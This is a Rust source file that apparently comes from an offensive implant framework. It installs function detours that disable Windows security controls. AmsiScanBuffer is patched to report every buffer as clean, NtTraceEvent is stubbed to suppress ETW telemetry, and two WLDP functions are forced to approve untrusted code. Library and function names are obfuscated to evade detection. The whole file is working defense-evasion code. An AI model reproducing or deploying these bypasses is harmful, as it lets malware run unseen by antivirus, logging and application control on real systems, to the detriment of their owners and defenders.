use std::{ffi::c_void, sync::atomic};
use super::apis::{m_load_library_a, m_get_proc_address};

use detour::static_detour;

type AmsiScanBufferFn = unsafe extern "system" fn(
    *mut c_void, *const u8, u32,
    *mut u16, *mut c_void, *mut u32 
) -> i32;
type NtTraceEvent = unsafe extern "system" fn(
    Handle: *mut c_void, Event: *mut c_void
) -> i32;
type WldpQueryDynamicCodeTrustFn = unsafe extern "system" fn(
    handle: *mut c_void,
    baseimage: *const c_void,
    image_size: u32
) -> u32;
type WldpIsClassInApprovedListFn = unsafe extern "system" fn(
    class_id: *const c_void,
    hostinformation: *const c_void,
    isapproved: *mut i32,
    option_flags: u32,
) -> u32;

static mut AMSI_BYPASS_BE_INITED: bool = false;
static mut ETW_BYPASS_BE_INITED: bool = false;
static mut WLDP_BYPASS_BE_INITED: bool = false;
static mut AMSI_BYPASS_ATOMIC: atomic::AtomicU8 = atomic::AtomicU8::new(0);
static mut WLDP_BYPASS_ATOMIC: atomic::AtomicU8 = atomic::AtomicU8::new(0);
static mut ETW_BYPASS_ATOMIC: atomic::AtomicU8 = atomic::AtomicU8::new(0);

static_detour! {
    static AmsiScanBufferDetour: unsafe extern "system" fn(
        *mut c_void,*const u8,u32,*mut u16,
        *mut c_void,*mut u32 
    ) -> i32;
    static WldpQueryDynamicCodeTrustDetour: unsafe extern "system" fn(
        *mut c_void, *const c_void, u32
    ) -> u32;
    static WldpIsClassInApprovedListDetour: unsafe extern "system" fn(
        *const c_void, *const c_void, *mut i32, u32
    ) -> u32;
    static NtTraceEventDetour: unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32;
}

pub unsafe fn bypass_wldp() {
    if !WLDP_BYPASS_BE_INITED {
        let wldp_module = m_load_library_a(
            obfstr::obfstr!("wldp.dll\x00").as_ptr()
        );
        if wldp_module.is_null() {
            return;
        }
        let wldp_query_dynamic_code_trust = m_get_proc_address(
            wldp_module, 
            obfstr::obfstr!("WldpQueryDynamicCodeTrust\x00").as_ptr()
        );
        if wldp_query_dynamic_code_trust.is_null() {
            return;
        }
        let original_wldp_query_dynamic_code_trust: WldpQueryDynamicCodeTrustFn = 
            std::mem::transmute(wldp_query_dynamic_code_trust);
        let _ = WldpQueryDynamicCodeTrustDetour.initialize(original_wldp_query_dynamic_code_trust, |_,_,_| {
            return 0;
        });
        let wldp_is_class_in_approved_list = m_get_proc_address(
            wldp_module, 
            obfstr::obfstr!("WldpIsClassInApprovedList\x00").as_ptr()
        );
        if wldp_is_class_in_approved_list.is_null() {
            return;
        }
        let original_wldp_is_class_in_approved_list: WldpIsClassInApprovedListFn = 
            std::mem::transmute(wldp_is_class_in_approved_list);
        let _ = WldpIsClassInApprovedListDetour.initialize(original_wldp_is_class_in_approved_list, |_,_,is_approved,_| {
            *is_approved = 1;
            return 0;
        });
    }
    let _ = WldpQueryDynamicCodeTrustDetour.enable();
    let _ = WldpIsClassInApprovedListDetour.enable();
    WLDP_BYPASS_ATOMIC.fetch_add(1, atomic::Ordering::AcqRel);

}

pub unsafe fn bypass_amsi() {
    if !AMSI_BYPASS_BE_INITED {
        let amsi_module = m_load_library_a(
            obfstr::obfstr!("amsi.dll\x00").as_ptr()
        );
        if amsi_module.is_null() {
            return;
        }
        let amsi_scan_buffer = m_get_proc_address(
            amsi_module, 
            obfstr::obfstr!("AmsiScanBuffer\x00").as_ptr()
        );
        if amsi_scan_buffer.is_null() {
            return;
        }
        let original_amsi: AmsiScanBufferFn = 
            std::mem::transmute(amsi_scan_buffer);
        let _ = AmsiScanBufferDetour.initialize(original_amsi, |_,_,_,_,_, value: *mut u32| {
            // AMSI_RESULT_CLEAN
            *value = 0;
            return 0;
        });
        AMSI_BYPASS_BE_INITED = true;
    }
    let _ = AmsiScanBufferDetour.enable();
    AMSI_BYPASS_ATOMIC.fetch_add(1, atomic::Ordering::AcqRel);
}

pub unsafe fn bypass_etw() {

    #[cfg(feature = "source")]
    {
        if !ETW_BYPASS_BE_INITED {
            use malefic_win_kit::apis::DynamicApis::NT_TRACE_EVENT;
            if NT_TRACE_EVENT.is_none() {
                return;
            }
            let nt_trace_event = NT_TRACE_EVENT.as_ref().unwrap();
            let original_nt_trace_event: NtTraceEvent = std::mem::transmute(*nt_trace_event);
            let _ = NtTraceEventDetour.initialize(original_nt_trace_event, |_,_| {
                return 0;
            });
            ETW_BYPASS_BE_INITED = true;
        }
        let _ = NtTraceEventDetour.enable();
        ETW_BYPASS_ATOMIC.fetch_add(1, atomic::Ordering::AcqRel);
    }
    #[cfg(feature = "prebuild")]
    {
        if !ETW_BYPASS_BE_INITED {
            let etw_module = m_load_library_a(
                obfstr::obfstr!("ntdll.dll\x00").as_ptr()
            );
            if etw_module.is_null() {
                return;
            }
            let nt_trace_event = m_get_proc_address(
                etw_module, 
                obfstr::obfstr!("NtTraceEvent\x00").as_ptr()
            );
            if nt_trace_event.is_null() {
                return;
            }
            let original_nt_trace_event: NtTraceEvent = 
                std::mem::transmute(nt_trace_event);
            let _ = NtTraceEventDetour.initialize(original_nt_trace_event, |_,_| {
                return 0;
            });
            ETW_BYPASS_BE_INITED = true;
        }
        let _ = NtTraceEventDetour.enable();
        ETW_BYPASS_ATOMIC.fetch_add(1, atomic::Ordering::AcqRel);
    }
}

pub unsafe fn enable_amsi() {
    AMSI_BYPASS_ATOMIC.fetch_sub(1, atomic::Ordering::AcqRel);
    if AMSI_BYPASS_ATOMIC.load(atomic::Ordering::Acquire) > 0 {
        return;
    }
    let _ = AmsiScanBufferDetour.disable();
}

pub unsafe fn enable_etw() {
    ETW_BYPASS_ATOMIC.fetch_sub(1, atomic::Ordering::AcqRel);
    if ETW_BYPASS_ATOMIC.load(atomic::Ordering::Acquire) > 0 {
        return;
    }
    let _ = NtTraceEventDetour.disable();
}

pub unsafe fn enable_wldp() {
    WLDP_BYPASS_ATOMIC.fetch_sub(1, atomic::Ordering::AcqRel);
    if WLDP_BYPASS_ATOMIC.load(atomic::Ordering::Acquire) > 0 {
        return;
    }
    let _ = WldpQueryDynamicCodeTrustDetour.disable();
    let _ = WldpIsClassInApprovedListDetour.disable();
}